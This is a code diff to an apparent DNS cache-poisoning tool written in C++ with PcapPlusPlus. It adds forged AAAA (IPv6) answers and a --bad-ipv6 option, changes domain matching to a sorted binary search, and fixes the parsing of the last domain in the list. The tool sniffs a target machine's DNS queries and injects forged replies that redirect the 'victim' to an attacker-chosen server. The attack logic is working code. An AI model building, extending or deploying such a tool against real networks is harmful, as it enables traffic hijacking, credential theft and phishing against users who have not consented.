@@ -110,26 +110,27 @@ void Program::OnPacketCapture(pcpp::RawPacket* packet, pcpp::PcapLiveDevice* dev
 
     if (args.specificDomains)
     {
-        bool domainMatch = false;
-        for(const std::string& domain : args.domains)
+        if(std::binary_search(args.domains.begin(), args.domains.end(), dnsQueryName))
         {
-            if (query->getName().compare(domain) == 0)
-            {
-                switch(query->getDnsType())
+            switch(query->getDnsType())
                 {
                     case pcpp::DnsType::DNS_TYPE_A:
                     {
                         PoisonARecord(poisonedDnsLayer, query);
-                        domainMatch = true;
-                        continue;
+                        break;
                     }
+                    case pcpp::DnsType::DNS_TYPE_AAAA:
+                    {
+                        PoisonAAAARecord(poisonedDnsLayer, query);
+                        break;
+                    }
+                    default:
+                        break;
                 }
-                break;
-            }
         }
-        if (!domainMatch)
+        else
         {
-            return; // No response for this query
+            return;
         }
     }
     else
@@ -141,6 +142,13 @@ void Program::OnPacketCapture(pcpp::RawPacket* packet, pcpp::PcapLiveDevice* dev
                 PoisonARecord(poisonedDnsLayer, query);
                 break;
             }
+            case pcpp::DnsType::DNS_TYPE_AAAA:
+            {
+                PoisonAAAARecord(poisonedDnsLayer, query);
+                break;
+            }
+            default:
+                break;
         }
     }
 #endif
@@ -195,11 +203,19 @@ void Program::PoisonARecord(pcpp::DnsLayer& dnsLayer, pcpp::DnsQuery* const quer
     dnsLayer.addAnswer(query->getName(), query->getDnsType(), query->getDnsClass(), args.poisonTtl, &poisonedData);
 }
 
+void Program::PoisonAAAARecord(pcpp::DnsLayer& dnsLayer, pcpp::DnsQuery* const query)
+{
+    pcpp::IPv6DnsResourceData poisonedData(args.hostv6Address);
+    dnsLayer.addQuery(query);
+    dnsLayer.addAnswer(query->getName(), query->getDnsType(), query->getDnsClass(), args.poisonTtl, &poisonedData);
+}
+
 void Program::ParseArguments(int argc, char* argv[])
 {
     parser.add_argument("-t", "--target").required().help("IP Address of the machine whose cache to poison");
     parser.add_argument("-i", "--interface").required().help("Network Interface to use (takes an IP address or a name");
-    parser.add_argument("-b", "--bad_ip").required().help("IP Address to inject into the cache. This shold be the address of the server you want to redirect the victim to");
+    parser.add_argument("-b", "--bad-ip").required().help("IP Address to inject into the cache. This shold be the address of the server you want to redirect the victim to");
+    parser.add_argument("--bad-ipv6").help("IPv6 Address to inject into the cache. This shold be the address of the server you want to redirect the victim to");
     parser.add_argument("--ttl").default_value<uint32_t>(300).help("The time-to-live of the poisoned DNS record (specified in seconds). Defaults to 300s or 5min.").scan<'u', uint32_t>();
     parser.add_argument("-d", "--domains").help("Specific domains to poison - enter them in a comma-separated list without spaces");
     parser.add_argument("-k", "--keep-alive").default_value(false).implicit_value(true).help("Used to tell deserter that it should keep waiting for more probes even after a successful poisoning.");
@@ -210,10 +226,20 @@ void Program::ParseArguments(int argc, char* argv[])
         parser.parse_args(argc, argv);
 
         // parse bad IP
-        args.hostAddress = pcpp::IPv4Address(parser.get("--bad_ip"));
+        args.hostAddress = pcpp::IPv4Address(parser.get("--bad-ip"));
         if (!args.hostAddress.isValid())
         {
             errors.push_back("Invalid malicious IP specified!");
+        }
+
+        // parse bad IPv6
+        if (parser.is_used("--bad-ipv6"))
+        {
+            args.hostv6Address = pcpp::IPv6Address(parser.get("--bad-ipv6"));
+            if (!args.hostv6Address.isValid())
+            {
+                errors.push_back("Invalid malicious IPv6 specified!");
+            }
         }
 
         // parse interface
@@ -237,7 +263,7 @@ void Program::ParseArguments(int argc, char* argv[])
         {
             args.specificDomains = true;
             std::string domains = parser.get("--domains");
-
+            int i = 0;
             size_t pos = 0;
             // Put the domains in a list
             while ((pos = domains.find(",")) != std::string::npos) 
@@ -245,6 +271,9 @@ void Program::ParseArguments(int argc, char* argv[])
                 args.domains.push_back(domains.substr(0, pos));
                 domains.erase(0, pos + 1);
             }
+            args.domains.push_back(domains); // push the last element
+
+            std::sort(args.domains.begin(), args.domains.end());
         }
 
         args.keepAlive = parser.get<bool>("--keep-alive");
